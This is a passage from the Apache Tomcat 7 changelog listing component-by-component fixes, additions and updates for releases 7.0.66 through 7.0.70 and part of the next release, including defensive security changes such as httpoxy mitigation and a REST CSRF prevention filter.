[httpoxy](https://httpoxy.org) ([CVE-2016-5388](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5388)) by default and to provide a mechanism that can be used to mitigate any future, similar issues. (markt) | | add | When adding and removing `ResourceLink`s dynamically, ensure that the global resource is only visible via the `ResourceLinkFactory` when it is meant to be. (markt) | | fix | [60008](https://bz.apache.org/bugzilla/show_bug.cgi?id=60008): When processing CORs requests, treat any origin with a URI scheme of `file` as a valid origin. (markt) | | fix | Improve handling of exceptions during a Lifecycle events triggered by a state transition. The exception is now caught and the component is now placed into the `FAILED` state. (markt) | | fix | Fix a file descriptor leak when reading the global web.xml. (markt) | | fix | [60041](https://bz.apache.org/bugzilla/show_bug.cgi?id=60041): Better error message if a JAR is deleted while a web application is running. Note: Deleting a JAR while the application is running is not supported and errors are expected. Based on a patch by gehui. (markt) | |  | **Coyote** | | --- | | | fix | Improve error handling around user code prior to calling `InstanceManager.destroy()` to ensure that the method is executed. (markt) | | --- | --- | | fix | [59904](https://bz.apache.org/bugzilla/show_bug.cgi?id=59904): Add a limit (default 200) for the number of cookies allowed per request. Based on a patch by gehui. (markt) | | fix | Make timing attacks against the Realm implementations harder. (schultz) | | add | Refactor the code that implements the requirement that a call to `complete()` or `dispatch()` made from a non-container thread before the container initiated thread that called `startAsync()` completes must be delayed until the container initiated thread has completed. Rather than implementing this by blocking the non-container thread, extend the internal state machine to track this. This removes the possibility that blocking the non-container thread could trigger a deadlock. (markt) | |  | **Jasper** | | --- | | | fix | Improve error handling around user code prior to calling `InstanceManager.destroy()` to ensure that the method is executed. (markt) | | --- | --- | | fix | Improve the error handling for custom tags to ensure that the tag is returned to the pool or released and destroyed once used. (markt) | | fix | Fixed StringIndexOutOfBoundsException. Based on a patch provided by wuwen via Github. (violetagg) | |  | **WebSocket** | | --- | | | fix | Improve error handling around user code prior to calling `InstanceManager.destroy()` to ensure that the method is executed. (markt) | | --- | --- | | fix | [59868](https://bz.apache.org/bugzilla/show_bug.cgi?id=59868): Clarify the documentation for the Manager web application to make clearer that the host name and IP address in the server section are the primary host name and IP address. (markt) | | fix | [59908](https://bz.apache.org/bugzilla/show_bug.cgi?id=59908): Ensure that a reason phrase is included in the close message if a session is closed due to a timeout. (markt) | |  | **Web Applications** | | --- | | | fix | Do not log an additional case of `IOException`s in the error handler for the Drawboard WebSocket example when the root cause is the client disconnecting since the logs add no value. (markt) | | --- | --- | | fix | [59642](https://bz.apache.org/bugzilla/show_bug.cgi?id=59642): Mention the `localDataSource` in the `DataSourceRealm` section of the Realm How-To. (markt) | | fix | Follow-up to the fix for [59399](https://bz.apache.org/bugzilla/show_bug.cgi?id=59399). Ensure that the new attribute `transportGuaranteeRedirectStatus` is documented for all **Realm**s. Also document the `NullRealm` and when it is automatically created for an **Engine**. (markt) | | fix | MBeans Descriptors How-To is moved to `mbeans-descriptors-howto.html`. Patch provided by Radoslav Husar. (violetagg) | | fix | [60034](https://bz.apache.org/bugzilla/show_bug.cgi?id=60034): Correct a typo in the Manager How-To page of the documentation web application. (markt) | |  | **Tribes** | | --- | | | add | Add log message when the ping has timed-out. (kfujino) | | --- | --- | | fix | If the ping message has been received at the `AbstractReplicatedMap#leftOver` method, ensure that notify the member is alive than ignore it. (kfujino) | |  | **jdbc-pool** | | --- | | | fix | Fix the duplicated connection release when connection verification failed. (kfujino) | | --- | --- | | fix | Ensure that do not remove the abandoned connection that has been already released. (kfujino) | | fix | In order to avoid the unintended skip of `PoolCleaner`, remove the check code of the execution interval in the task that has been scheduled. (kfujino) | | fix | [59849](https://bz.apache.org/bugzilla/show_bug.cgi?id=59849): Ensure that the connection verification is executed by `initSQL` (if required) if the borrowing `PooledConnection` has not been initialized. (kfujino) | | fix | [59850](https://bz.apache.org/bugzilla/show_bug.cgi?id=59850): Ensure that the `ResultSet` is closed when enabling the `StatementCache` interceptor. (kfujino) | | fix | [59923](https://bz.apache.org/bugzilla/show_bug.cgi?id=59923): Reduce the default value of `validationInterval` in order to avoid the potential issue that continues to return an invalid connection after database restart. (kfujino) | | fix | Ensure that the `ResultSet` is returned as Proxy object when enabling the `StatementDecoratorInterceptor`. (kfujino) | | fix | [60043](https://bz.apache.org/bugzilla/show_bug.cgi?id=60043): Ensure that the `suspectTimeout` works without removing connection when the `removeAbandoned` is disabled. (kfujino) | | fix | Add log message of when returning the connection that has been marked suspect. (kfujino) | | fix | Correct Javadoc for `ConnectionPool.suspect()`. Based on a patch by Yahya Cahyadi. (markt) | |  | **Other** | | --- | | | add | Use the mirror network rather than the ASF master site to download the current ASF dependencies. (markt) | | --- | --- | | update | Update the packaged version of the Tomcat Native Library to 1.2.8 to pick up the latest fixes and make 1.2.8 the minimum recommended version. (markt) | | fix | Fixed typos in mbeans-descriptors.xml files. (violetagg) | | update | Update the internal fork of Commons BCEL to r1757132 to align with the BCEL 6 release. (markt) | | update | Update the internal fork of Commons Codec to r1757174. Code formatting changes only. (markt) | | update | Update the internal fork of Commons FileUpload to afdedc9. This pulls in a fix to improve the performance with large multipart boundaries. (markt) | | fix | Update the download location for Objenesis. (violetagg) | | | |  | **Tomcat 7.0.70 (violetagg)** | **released 2016-06-20** | | --- | --- | | | **Catalina** | | --- | | | fix | [59219](https://bz.apache.org/bugzilla/show_bug.cgi?id=59219): Ensure `AsyncListener.onError()` is called if an `Exception` is thrown during async processing. (markt) | | --- | --- | | fix | [59220](https://bz.apache.org/bugzilla/show_bug.cgi?id=59220): Ensure that `AsyncListener.onComplete()` is called if the async request times out and the response is already committed. (markt) | | fix | [59261](https://bz.apache.org/bugzilla/show_bug.cgi?id=59261): `ServletRequest.getAsyncContext()` now throws an `IllegalStateException` as required by the Servlet specification if the request is not in asynchronous mode when called. (markt) | | fix | [59310](https://bz.apache.org/bugzilla/show_bug.cgi?id=59310): Do not add a `Content-Length: 0` header for custom responses to `HEAD` requests that do not set a `Content-Length` value. (markt) | | fix | When normalizing paths, improve the handling when paths end with `/.` or `/..` and ensure that input and output are consistent with respect to whether or not they end with `/`. (markt) | | fix | [59317](https://bz.apache.org/bugzilla/show_bug.cgi?id=59317): Ensure that `HttpServletRequest.getRequestURI()` returns an encoded URI rather than a decoded URI after a dispatch. (markt) | | fix | Ensure that the value for the header `X-Frame-Options` is constructed correctly according to the specification when `ALLOW-FROM` option is used. (violetagg) | | add | [59399](https://bz.apache.org/bugzilla/show_bug.cgi?id=59399): Add a new option to the Realm implementations that ship with Tomcat that allows the HTTP status code used for HTTP -> HTTPS redirects to be controlled per Realm. (markt) | | fix | [59449](https://bz.apache.org/bugzilla/show_bug.cgi?id=59449): In `ContainerBase`, ensure that the process to remove a child container is the reverse of the process to add one. Patch provided by Huxing Zhang. (markt) | | fix | RMI Target related memory leaks are avoidable which makes them an application bug that needs to be fixed rather than a JRE bug to work around. Therefore, start logging RMI Target related memory leaks on web application stop. Add an option that controls if the check for these leaks is made. Log a warning if running on Java 9 with this check enabled but without the command line option it requires. (markt) | | fix | Fix a potential concurrency issue with the web application class loader and concurrent reads and writes of the resource cache. (markt) | | fix | [59619](https://bz.apache.org/bugzilla/show_bug.cgi?id=59619): Within the web application class loader, always use path as the key for the resource cache to improve the hit ratio. This also fixes a problem exposed by the fix for [56777](https://bz.apache.org/bugzilla/show_bug.cgi?id=56777) that enabled file based configuration resources to be loaded from the class path. (markt) | | fix | Fix error message when failed to register MBean. (kfujino) | |  | **Coyote** | | --- | | | fix | [58970](https://bz.apache.org/bugzilla/show_bug.cgi?id=58970): Fix a connection counting bug in the NIO connector that meant some dropped connections were not removed from the current connection count. (markt) | | --- | --- | | fix | [59289](https://bz.apache.org/bugzilla/show_bug.cgi?id=59289): Do not recycle upgrade processors in unexpected close situations. (remm) | | fix | Ensure that requests with HTTP method names that are not tokens (as required by RFC 7231) are rejected with a 400 response. (markt) | | fix | When an asynchronous request is processed by the AJP connector, ensure that request processing has fully completed before starting the next request. (markt) | | fix | If an async dispatch results in the completion of request processing, ensure that any remaining request body is swallowed before starting the processing of the next request else the remaining body may be read as the start of the next request leading to a 400 response. (markt) | |  | **Jasper** | | --- | | | fix | Fix a memory leak in the expression language implementation that caused the class loader of the first web application to use expressions to be pinned in memory. (markt) | | --- | --- | | fix | [59654](https://bz.apache.org/bugzilla/show_bug.cgi?id=59654): Enforce the requirements of section 7.3.1 of the JSP specification regarding the permitted locations for TLD files. Patch provided by Huxing Zhang. (markt) | |  | **WebSocket** | | --- | | | fix | Ensure that a client disconnection triggers the error handling for the associated WebSocket end point. (markt) | | --- | --- | |  | **Web Applications** | | --- | | | fix | Correct a typo in SSL/TLS Configuration How-To. Issue reported via comments.apache.org. (violetagg) | | --- | --- | | fix | [58891](https://bz.apache.org/bugzilla/show_bug.cgi?id=58891): Update the SSL how-to. Based on a suggestion by Alexander Kjäll. (markt) | |  | **Tribes** | | --- | | | fix | Fix potential NPE that depends on the setting order of attributes of static member when using the static cluster. (kfujino) | | --- | --- | | add | Add get/set method for the channel that is related to `ChannelInterceptorBase`. (kfujino) | | fix | As with the multicast cluster environment, in the static cluster environment, the local member inherits properties from the cluster receiver. (kfujino) | | add | Add get/set method for the channel that is related to each Channel services. (kfujino) | | add | Add name to channel in order to identify channels. In tomcat cluster environment, it is set the cluster name + "-Channel" as default value. (kfujino) | | add | Add the channel name to the thread which is invoked by channel services in order to identify the associated channel. (kfujino) | | fix | Ensure that clear the channel instance from channel services when stopping channel. (kfujino) | | add | Implement map state in the replication map. (kfujino) | | fix | Ensure that the ping is not executed during the start/stop of the replication map. (kfujino) | | fix | In ping processing in the replication map, send not the `INIT` message but the newly introduced `PING` message. (kfujino) | |  | **jdbc-pool** | | --- | | | fix | Fix a memory leak with the pool cleaner thread that retained a reference to the web application class loader for the first web application to use a connection pool. (markt) | | --- | --- | |  | **Other** | | --- | | | update | Update the packaged version of the Tomcat Native Library to 1.2.7 to pick up the Windows binaries that are based on OpenSSL 1.0.2h and APR 1.5.2. (violetagg/markt) | | --- | --- | | update | Remove native code (Windows Service Wrapper, APR/native connector) support for Windows Itanium. (markt) | | update | Update the internal fork of Commons File Upload to r1743698 (1.3.1 plus additional fixes). (markt) | | fix | [58626](https://bz.apache.org/bugzilla/show_bug.cgi?id=58626): Add support for a new environment variable (`USE_NOHUP`) that causes `nohup` to be used when starting Tomcat. It is disabled by default except on HP-UX where it is enabled by default since it is required when starting Tomcat at boot on HP-UX. (markt) | | | |  | **Tomcat 7.0.69 (violetagg)** | **released 2016-04-15** | | --- | --- | | | **Catalina** | | --- | | | fix | Fix the type of `InstanceManager` attribute of mbean definition of `StandardContext`. (kfujino) | | --- | --- | | add | [58351](https://bz.apache.org/bugzilla/show_bug.cgi?id=58351): Make the server build date and server version number accessible via JMX. Patch provided by Huxing Zhang. (markt) | | fix | [59001](https://bz.apache.org/bugzilla/show_bug.cgi?id=59001): Correctly handle the case when Tomcat is installed on a path where one of the segments ends in an exclamation mark. (markt) | | fix | Expand the fix for [59001](https://bz.apache.org/bugzilla/show_bug.cgi?id=59001) to cover the special sequences used in Tomcat's custom jar:war: URLs. (markt) | | fix | [59043](https://bz.apache.org/bugzilla/show_bug.cgi?id=59043): Avoid warning while expiring sessions associated with a single sign on if `HttpServletRequest.logout()` is used. (markt) | | fix | [59054](https://bz.apache.org/bugzilla/show_bug.cgi?id=59054): Ensure that using the `CrawlerSessionManagerValve` in a distributed environment does not trigger an error when the Valve registers itself in the session. (markt) | | add | Log a warning message if a user tries to configure the default session timeout via the deprecated (and ignored) `Manager.setMaxInactiveInterval()` method. (markt) | | fix | Correct a regression introduced in 7.0.68 where the deprecated `Manager.getMaxInactiveInterval()` method returned the current default session timeout in minutes rather than seconds. (markt) | | fix | When a Host is configured with an appBase that does not exist, create the appBase before trying to expand an external WAR file into it. (markt) | | fix | [59115](https://bz.apache.org/bugzilla/show_bug.cgi?id=59115): When using the Servlet 3.0 file upload, the submitted file name may be provided as a token or a quoted-string. If a quoted-string, unquote the string before returning it to the user. (markt) | | fix | [59123](https://bz.apache.org/bugzilla/show_bug.cgi?id=59123): Close `NamingEnumeration` objects used by the `JNDIRealm` once they are no longer required. (fschumacher/markt) | | fix | [59138](https://bz.apache.org/bugzilla/show_bug.cgi?id=59138): Correct a false positive warning for ThreadLocal related memory leaks when the key class but not the value class has been loaded by the web application class loader. (markt) | | fix | [59145](https://bz.apache.org/bugzilla/show_bug.cgi?id=59145): Don't log an invalid warning when a user logs out of a session associated with SSO. (markt) | | fix | [59151](https://bz.apache.org/bugzilla/show_bug.cgi?id=59151): Fix a regression in the fix for [56917](https://bz.apache.org/bugzilla/show_bug.cgi?id=56917) that added additional (and arguably unnecessary) validation to the provided redirect location. (markt) | | fix | [59206](https://bz.apache.org/bugzilla/show_bug.cgi?id=59206): Ensure NPE will not be thrown by `o.a.tomcat.util.file.ConfigFileLoader` when `catalina.base` is not specified. (violetagg) | | fix | [59213](https://bz.apache.org/bugzilla/show_bug.cgi?id=59213): Async dispatches should be based off a wrapped request. (remm) | | fix | [59217](https://bz.apache.org/bugzilla/show_bug.cgi?id=59217): Remove duplication in the recycling of the path in `o.a.tomcat.util.http.ServerCookie`. Patch is provided by Kyohei Nakamura. (violetagg) | | fix | Ensure that `javax.servlet.ServletRequest` and `javax.servlet.ServletResponse` provided during `javax.servlet.AsyncListener` registration are made available via `javax.servlet.AsyncEvent.getSuppliedRequest` and `javax.servlet.AsyncEvent.getSuppliedResponse` (violetagg) | | fix | Clarify the log message that specifying both urlPatterns and value attributes in WebServlet and WebFilter annotations is not allowed. (violetagg) | | fix | Ensure the exceptions caused by Valves will be available in the log files so that they can be evaluated when `o.a.catalina.valves.ErrorReportValve.showReport` is disabled. Patch is provided by Svetlin Zarev. (violetagg) | | fix | [59247](https://bz.apache.org/bugzilla/show_bug.cgi?id=59247): Preload ResourceEntry as a workaround for security manager issues on some JVMs. (kkolinko/remm) | | fix | [59269](https://bz.apache.org/bugzilla/show_bug.cgi?id=59269): Correct the implementation of `PersistentManagerBase` so that `minIdleSwap` functions as designed and sessions are swapped out to keep the active session count below `maxActiveSessions`. (markt) | |  | **Coyote** | | --- | | | fix | [58646](https://bz.apache.org/bugzilla/show_bug.cgi?id=58646): Correct a problem with sendfile that resulted in a Processor being added to the cache twice leading to broken responses. (markt) | | --- | --- | | fix | [59015](https://bz.apache.org/bugzilla/show_bug.cgi?id=59015): Fix potential cause of endless APR Poller loop during shutdown if the Poller experiences an error during the shutdown process. (markt) | | fix | Limit the default TLS ciphers for JSSE (BIO, NIO) and OpenSSL (APR) to those currently considered secure. (markt) | | add | Add a new environment variable `JSSE_OPTS` that is intended to be used to pass JVM wide configuration to the JSSE implementation. The default value is `-Djdk.tls.ephemeralDHKeySize=2048` which protects against weak Diffie-Hellman keys. (markt) | |  | **WebSocket** | | --- | | | fix | [59014](https://bz.apache.org/bugzilla/show_bug.cgi?id=59014): Ensure that a WebSocket close message can be sent after a close message has been received. (markt) | | --- | --- | | fix | Correctly handle compression of partial messages when the final message fragment has a zero length payload. (markt) | | add | Extend the WebSocket programmatic echo endpoint provided in the examples to handle binary messages and also partial messages. This aligns the code with Tomcat 8 and makes it easier to run the Autobahn testsuite against the WebSocket implementation. (markt) | | fix | [59119](https://bz.apache.org/bugzilla/show_bug.cgi?id=59119): Correct read logic for WebSocket client when using secure connections. (markt) | | fix | [59134](https://bz.apache.org/bugzilla/show_bug.cgi?id=59134): Correct client connect logic for secure connections made through a proxy. (markt) | | fix | [59189](https://bz.apache.org/bugzilla/show_bug.cgi?id=59189): Explicitly release the native memory held by the `Inflater` and `Deflater` when using PerMessageDeflate and the WebSocket session ends. Based on a patch by Henrik Olsson. (markt) | |  | **Web Applications** | | --- | | | fix | Correct the description of the `ServletRequest.getServerPort()` in Proxy How-To. Issue reported via comments.apache.org. (violetagg) | | --- | --- | | fix | Fix a potential indefinite wait in the Comet Chat servlet in the examples web application. (markt) | | fix | [59229](https://bz.apache.org/bugzilla/show_bug.cgi?id=59229): Fix error in HTTP docs and make clear that the HTTP NIO connector uses non-blocking I/O to read the HTTP request headers. (markt) | | fix | Update in the documentation the link to the maven repository where Tomcat snapshot artifacts are deployed. (markt/violetagg) | | fix | Clarify in the documentation that calls to `ServletContext.log(String, Throwable)` or `GenericServlet.log(String, Throwable)` are logged at the SEVERE level. (violetagg) | |  | **Tribes** | | --- | | | fix | If promoting a proxy node to a primary node when getting a session, notify the change of the new primary node to the original backup node. (kfujino) | | --- | --- | | fix | Avoid NPE when a proxy node failed to retrieve a backup entry. (kfujino) | | add | Add log of when received an unexpected messages. (kfujino) | | add | Add the flag indicating that member is a localMember. (kfujino) | |  | **Other** | | --- | | | fix | [58283](https://bz.apache.org/bugzilla/show_bug.cgi?id=58283): Change the default download location for libraries during the build process from `/usr/share/java` to `${user.home}/tomcat-build-libs`. Patch provided by Ahmed Hosni. (markt) | | --- | --- | | fix | [59031](https://bz.apache.org/bugzilla/show_bug.cgi?id=59031): When using the Windows uninstaller, do not remove the contents of any directories that have been symlinked into the Tomcat directory structure. (markt) | | update | Modify the default `tomcat-users.xml` file to make it harder for users to configure the entries intended for use with the examples web application for the Manager application. (markt) | | fix | [59211](https://bz.apache.org/bugzilla/show_bug.cgi?id=59211): Add hamcrest to Eclipse classpath. Patch is provided by Huxing Zhang. (violetagg) | | update | [59280](https://bz.apache.org/bugzilla/show_bug.cgi?id=59280): Update the NSIS Installer used to build the Windows Installers to version 2.51. (kkolinko) | | | |  | **Tomcat 7.0.68 (violetagg)** | **released 2016-02-16** | | --- | --- | | | **General** | | --- | | | add | Allow to configure multiple JUnit test class patterns with the build property `test.name` and document the property in BUILDING.txt. (rjung) | | --- | --- | |  | **Catalina** | | --- | | | fix | Correct implementation of `validateClientProvidedNewSessionId` so client provided session IDs may be rejected if validation is enabled. (markt) | | --- | --- | | fix | [56785](https://bz.apache.org/bugzilla/show_bug.cgi?id=56785): Avoid `NullPointerException` if directory exists on the class path that is not readable by the Tomcat user. (kkolinko) | | fix | [57906](https://bz.apache.org/bugzilla/show_bug.cgi?id=57906): Suppress WebappClassLoader log messages when running with a security manager on Java 6, caused by `java.beans.Introspector.findExplicitBeanInfo()` calls during evaluation of EL expressions. (kkolinko) | | fix | [58692](https://bz.apache.org/bugzilla/show_bug.cgi?id=58692): Make `StandardJarScanner` more robust. Log a warning if a class path entry cannot be scanned rather than triggering the failure of the web application. (markt) | | fix | [58701](https://bz.apache.org/bugzilla/show_bug.cgi?id=58701): Reset the `instanceInitialized` field in `StandardWrapper` when unloading a Servlet so that a new instance may be correctly initialized. (markt) | | fix | [58702](https://bz.apache.org/bugzilla/show_bug.cgi?id=58702): Ensure an access log entry is generated if the client aborts the connection. (markt) | | fix | Fixed various issues reported by Findbugs. (violetagg) | | fix | [58735](https://bz.apache.org/bugzilla/show_bug.cgi?id=58735): Add support for the `X-XSS-Protection` header to the `HttpHeaderSecurityFilter`. Patch provided by Jacopo Cappellato. (markt) | | fix | [58751](https://bz.apache.org/bugzilla/show_bug.cgi?id=58751): Correctly handle the case where an `AsyncListener` dispatches to a Servlet on an asynchronous timeout and the Servlet uses `sendError()` to trigger an error page. Includes a test case based on code provided by Andy Wilkinson.(markt) | | fix | [58765](https://bz.apache.org/bugzilla/show_bug.cgi?id=58765): Change default for `mapperContextRootRedirectEnabled` to `true` since this is required for correct session management because of the default for `sessionCookiePathUsesTrailingSlash`. (markt) | | fix | Add the `StatusManagerServlet` to the list of Servlets that can only be loaded by privileged applications. (markt) | | fix | Simplify code and fix messages in `org.apache.catalina.core.DefaultInstanceManager` class. (kkolinko) | | fix | Ensure that the proper file encoding if specified will be used when a readme file is served by DefaultServlet. (violetagg) | | fix | Fix declaration of `localPort` attribute of Connector MBean: it is read-only. (kkolinko) | | fix | [58766](https://bz.apache.org/bugzilla/show_bug.cgi?id=58766): Make skipping non-class files during annotation scanning faster by checking the file name first. Improve debug logging. (kkolinko) | | fix | [58768](https://bz.apache.org/bugzilla/show_bug.cgi?id=58768): Log a warning if a redirect fails because of an invalid location. (markt) | | fix | [58836](https://bz.apache.org/bugzilla/show_bug.cgi?id=58836): Correctly merge query string parameters when processing a forwarded request where the target includes a query string that contains a parameter with no value. (markt/kkolinko) | | fix | Make sure that shared Digester is reset in an unlikely error case in `HostConfig.deployWAR()`. (kkolinko) | | fix | Fix a potential JDBC resource leak in DataSourceRealm. (schultz) | | fix | [58900](https://bz.apache.org/bugzilla/show_bug.cgi?id=58900): Correctly undeploy symlinked resources and prevent an infinite cycle of deploy / undeploy. (markt) | | fix | Protect initialization of `ResourceLinkFactory` when running with a SecurityManager. (kkolinko) | | add | Extend the feature available in the cluster session manager implementations that enables session attribute replication to be filtered based on attribute name to all session manager implementations. Note that configuration attribute name has changed from `sessionAttributeFilter` to `sessionAttributeNameFilter`. Apply the filter on load as well as unload to ensure that configuration changes made while the web application is stopped are applied to any persisted data. (markt) | | add | Extend the session attribute filtering options to include filtering based on the implementation class of the value and optional `WARN` level logging if an attribute is filtered. These options are available for all of the Manager implementations that ship with Tomcat. When a `SecurityManager` is used filtering will be enabled by default. (markt) | | fix | [58905](https://bz.apache.org/bugzilla/show_bug.cgi?id=58905): Ensure that `Tomcat.silence()` silences the correct logger and respects the current setting. (markt) | | fix | [58946](https://bz.apache.org/bugzilla/show_bug.cgi?id=58946): Ensure that the request parameter map remains immutable when processing via a RequestDispatcher. (markt) | |  | **Coyote** | | --- | | | add | New configuration option `ajpFlush` for the AJP connectors to disable the sending of AJP flush packets. (rjung) | | --- | --- | |  | **Jasper** | | --- | | | fix | Fix handling of missing messages in `org.apache.el.util.MessageFactory`. (violetagg) | | --- | --- | | fix | Ignore `engineOptionsClass` and `scratchdir` when running under a security manager. (markt) | |  | **Cluster** | | --- | | | fix | In order to avoid that the heartbeat thread and the background thread to run `Channel.heartbeat` simultaneously, if `heartbeatBackgroundEnabled` of `SimpleTcpCluster` set to `true`, ensure that the heartbeat thread does not start. (kfujino) | | --- | --- | |  | **WebSocket** | | --- | | | fix | [57489](https://bz.apache.org/bugzilla/show_bug.cgi?id=57489): Ensure `onClose()` is called when a WebSocket connection is closed even if the sending of the close message fails. Includes test cases by Barry Coughlan. (markt) | | --- | --- | | fix | Fix a timing issue on session close that could result in an exception being thrown for an incomplete message even through the message was completed. (markt) | |  | **Web Applications** | | --- | | | fix | Correct some typos in the JNDI resources How-To. (markt) | | --- | --- | | fix | Don't create sessions unnecessarily in the Manager application. (markt) | | fix | Don't create sessions unnecessarily in the Host Manager application. (markt) | | fix | [58723](https://bz.apache.org/bugzilla/show_bug.cgi?id=58723): Clarify documentation and error messages for the text interface of the manager to make clear that version must be used with path when referencing contexts deployed using parallel deployment. (markt) | | fix | Correct an error in the documentation of the expected behaviour for automatic deployment. If a WAR is updated and an expanded directory is present, the directory will always be deleted and recreated by expanding the WAR if `unpackWARs` is `true`. (markt) | | fix | [58935](https://bz.apache.org/bugzilla/show_bug.cgi?id=58935): Remove incorrect references in the documentation to using `jar:file:` URLs with the Manager application. (markt) | |  | **Tribes** | | --- | | | fix | Add support for the startup notification of local members in the static cluster. (kfujino) | | --- | --- | | fix | Ignore the unnecessary member remove operation from different domain. (kfujino) | | fix | Add support for the shutdown notification of local members in the static cluster. (kfujino) | | fix | Ensure that asynchronous session replication thread is a daemon thread. (kfujino) | |  | **Other** | | --- | | | update | Update the NSIS Installer used to build the Windows Installers to version 2.50. (markt/kkolinko) | | --- | --- | | | |  | **Tomcat 7.0.67 (violetagg)** | **released 2015-12-10** | | --- | --- | | | **Catalina** | | --- | | | add | [56917](https://bz.apache.org/bugzilla/show_bug.cgi?id=56917): As per RFC7231 (HTTP/1.1), allow HTTP/1.1 and later redirects to use relative URIs. This is controlled by a new attribute `useRelativeRedirects` on the **Context** and defaults to `true`. (markt) | | --- | --- | | fix | [58660](https://bz.apache.org/bugzilla/show_bug.cgi?id=58660): Correct a regression in 7.0.66 caused by the change that moved the redirection for context roots from the Mapper to the Default Servlet. (markt) | | fix | Fixed potential NPE in `HostConfig` while deploying an application. Issue reported by coverity scan. (violetagg) | | fix | [58655](https://bz.apache.org/bugzilla/show_bug.cgi?id=58655): Fix an  `IllegalStateException` when calling `HttpServletResponse.sendRedirect()` with the `RemoteIpFilter`. This was caused by trying to correctly generate the absolute URI for the redirect. With the fix for [56917](https://bz.apache.org/bugzilla/show_bug.cgi?id=56917), redirects may now be relative making the `sendRedirect()` implementation for the `RemoteIpFilter` much simpler. This also addresses issues where the redirect may not have behaved as expected when redirecting from http to https to from https to http. (markt) | |  | **WebSocket** | | --- | | | fix | [58658](https://bz.apache.org/bugzilla/show_bug.cgi?id=58658): Correct a regression in 7.0.66 that prevented Tomcat from starting on Java 6 unless the WebSocket JARs (that require Java 7) were removed. (markt) | | --- | --- | |  | **Web Applications** | | --- | | | add | Add a description of the default value of `heartbeatSleeptime` attribute and `optionCheck` attribute in the cluster channel docs. (kfujino) | | --- | --- | |  | **Tribes** | | --- | | | fix | Fix potential NPE in `AbstractReplicatedMap.breakdown()`. (kfujino) | | --- | --- | | | |  | **Tomcat 7.0.66 (violetagg)** | **not released** | | --- | --- | | | **General** | | --- | | | update | [58596](https://bz.apache.org/bugzilla/show_bug.cgi?id=58596): Clarify the description in RUNNING.txt of how environment variables are used. (markt) | | --- | --- | |  | **Catalina** | | --- | | | fix | [34319](https://bz.apache.org/bugzilla/show_bug.cgi?id=34319): Only load those keys in `StoreBase.processExpire` from JDBCStore, that are old enough, to be expired. Based on a patch by Tom Anderson. (fschumacher) | | --- | --- | | fix | [56777](https://bz.apache.org/bugzilla/show_bug.cgi?id=56777): Allow file based configuration resources (user database, certificate revocation lists, keystores and trust stores) to be configured using URLs as well as files. Back-port provided by Huxing Zhang. (markt/violetagg) | | add | [57741](https://bz.apache.org/bugzilla/show_bug.cgi?id=57741): Enable the CGI servlet to use the standard error page mechanism. Note that if the CGI servlet's debug init parameter is set to 10 or higher then the standard error page mechanism will be bypassed and a debug response generated by the CGI servlet will be returned instead. (markt) | | add | [58486](https://bz.apache.org/bugzilla/show_bug.cgi?id=58486): Protect against two further possible memory leaks associated with XML parsing. (markt) | | code | [58497](https://bz.apache.org/bugzilla/show_bug.cgi?id=58497): Make `AbstractHttp11Processor` easy to extend. (markt) | | fix | [58508](https://bz.apache.org/bugzilla/show_bug.cgi?id=58508): Escape role names when generating associated MBeans in case the role name contains characters not permitted in an MBean name. (markt) | | fix | [58522](https://bz.apache.org/bugzilla/show_bug.cgi?id=58522): Fixed concurrency issue when iterating web application's resources. (violetagg) | | fix | [58534](https://bz.apache.org/bugzilla/show_bug.cgi?id=58534): Removed repeated conditional tests in `o.a.tomcat.websocket.pojo.PojoMethodMapping` and `o.a.tomcat.util.net.AprEndpoint` Patch provided by Anthony Whitford. (violetagg) | | fix | [58535](https://bz.apache.org/bugzilla/show_bug.cgi?id=58535): Use `Collections.reverseOrder` when a reverse ordering is needed. (violetagg) | | fix | [58537](https://bz.apache.org/bugzilla/show_bug.cgi?id=58537): Some of the inner classes in `o.a.catalina.valves.ExtendedAccessLogValve` are made static. Patch provided by Anthony Whitford. (violetagg) | | fix | [58540](https://bz.apache.org/bugzilla/show_bug.cgi?id=58540): Removed unused code from `o.a.catalina.connector.Request`. Patch provided by Anthony Whitford. (violetagg) | | fix | [58541](https://bz.apache.org/bugzilla/show_bug.cgi?id=58541), [58544](https://bz.apache.org/bugzilla/show_bug.cgi?id=58544): It is more efficient to call `Integer.toString(int)` instead of `Integer.valueOf(int).toString()` when only a string representation of a primitive is needed. Based on a patch provided by Anthony Whitford. (violetagg) | | fix | [58541](https://bz.apache.org/bugzilla/show_bug.cgi?id=58541), [58547](https://bz.apache.org/bugzilla/show_bug.cgi?id=58547): It is more efficient to call `valueOf(...)` instead of Number constructor. Based on a patch provided by Anthony Whitford. (violetagg) | | fix | [58545](https://bz.apache.org/bugzilla/show_bug.cgi?id=58545): In some use cases it is more efficient to use `Map.entrySet()` instead of `Map.keySet()` Based on a patch provided by Anthony Whitford. (violetagg) | | add | Add a new RestCsrfPreventionFilter that provides basic CSRF protection for REST APIs. (violetagg) | | fix | [58581](https://bz.apache.org/bugzilla/show_bug.cgi?id=58581): If a custom error page fails, fall back to the standard error page rather than throwing an NPE. Based on a patch by Huxing Zhang. (markt) | | fix | [58582](https://bz.apache.org/bugzilla/show_bug.cgi?id=58582): Combined realm should perform background processing on its sub-realms. Based upon a patch provided by Aidan. (kkolinko) | | fix | Handle the unlikely case where different versions of a web application are deployed with different session settings. (markt) | | add | Add a new Context option, enabled by default, that enables an additional check that a client provided session ID is in use in at least one other web application before allowing it to be used as the ID for a new session in the current web application. (markt) | | add | Add support for DIGEST authentication to the JNDIRealm. Based on a patch by Alexis Hassler. (markt) | | fix | [58603](https://bz.apache.org/bugzilla/show_bug.cgi?id=58603): Ensure that `HttpServletRequest.getRequestURL()` returns the correct value when using the `RemoteIpFilter`. (markt) | | fix | Ensure that in an embedded Tomcat the logging configuration is not lost during garbage collection. (violetagg) | | add | Move the functionality that provides redirects for context roots and directories where a trailing `/` is added from the Mapper to the `DefaultServlet`. This enables such requests to be processed by any configured Valves and Filters before the redirect is made. This behaviour is configurable via the `mapperContextRootRedirectEnabled` and `mapperDirectoryRedirectEnabled` attributes of the Context which may be used to restore the previous behaviour. (markt) | | fix | [58635](https://bz.apache.org/bugzilla/show_bug.cgi?id=58635): Enable break points to be set within agent code when running Tomcat with a Java agent. Based on a patch by Huxing Zhang. (markt) | | fix | Add path parameter handling to `HttpServletRequest.getContextPath()`. This is a follow-up to the fix for [57215](https://bz.apache.org/bugzilla/show_bug.cgi?id=57215). (markt) | |  | **Jasper** | | --- | | | fix | [57136#c25](https://bz.apache.org/bugzilla/show_bug.cgi?id=57136#c25): Implement a setting that controls what quoting rule is used when parsing EL 